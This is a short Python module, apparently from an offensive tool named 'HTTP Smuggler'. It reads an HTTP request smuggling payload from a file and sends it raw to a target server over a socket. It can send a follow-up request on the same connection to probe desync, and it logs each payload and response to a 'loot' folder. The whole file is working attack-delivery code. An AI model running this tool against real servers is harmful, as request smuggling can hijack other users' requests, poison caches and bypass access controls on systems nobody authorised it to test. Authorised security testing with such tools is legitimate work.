import os
import socket
import time
from urllib.parse import urlparse
from datetime import datetime

def _recv_all(sock, chunk_size=4096, idle_timeout=2):
    sock.settimeout(idle_timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(chunk_size)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data

def execute_payload(target, payload_path, send_follow_up=False, follow_up_req=None, follow_up_delay=0.5):
    # Resolve target → host/port (HTTP only; default 80)
    parsed = urlparse(target)
    host = parsed.hostname or target.replace("http://","").split("/")[0]
    port = parsed.port or 80

    if not os.path.isfile(payload_path):
        print(f"[!] File not found: {payload_path}")
        return

    with open(payload_path, "r", encoding="latin-1") as f:
        payload = f.read()

    os.makedirs("loot", exist_ok=True)
    stamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    base = host.replace(":", "_").replace("/", "_")
    log_file = f"loot/{base}_exec_{stamp}.txt"

    print(f"\n[*] Executing payload on {host}:{port}")
    print(f"[*] Payload: {payload_path}")
    print(f"[*] Log: {log_file}\n")

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((host, port))
            # Send the smuggled request raw, unmodified
            s.sendall(payload.encode("latin-1", errors="ignore"))

            # Optional follow-up (on SAME connection) to probe desync behavior
            if send_follow_up and follow_up_req:
                time.sleep(max(0.0, float(follow_up_delay)))
                s.sendall(follow_up_req.encode("latin-1", errors="ignore"))

            response = _recv_all(s).decode("latin-1", errors="ignore")

        with open(log_file, "w", encoding="latin-1") as lf:
            lf.write("=== HTTP Smuggler Execution Log ===\n")
            lf.write(f"Target: {target}\n")
            lf.write(f"Host: {host}:{port}\n")
            lf.write(f"Payload file: {payload_path}\n")
            lf.write(f"Timestamp (UTC): {stamp}\n")
            lf.write(f"Follow-up used: {send_follow_up}\n")
            lf.write("\n--- PAYLOAD SENT ---\n")
            lf.write(payload)
            if send_follow_up and follow_up_req:
                lf.write("\n--- FOLLOW-UP SENT ---\n")
                lf.write(follow_up_req)
            lf.write("\n--- RESPONSE RECEIVED ---\n")
            lf.write(response)

        print("[+] Execution complete.")
        print(f"[+] Response (first 200 chars):\n{response[:200]}")
        print(f"[+] Full log saved to {log_file}\n")

    except Exception as e:
        with open(log_file, "w", encoding="latin-1") as lf:
            lf.write("=== HTTP Smuggler Execution Error ===\n")
            lf.write(f"Target: {target}\n")
            lf.write(f"Payload file: {payload_path}\n")
            lf.write(f"Error: {repr(e)}\n")
        print(f"[!] Error: {e}")
        print(f"[!] Error log saved to {log_file}")
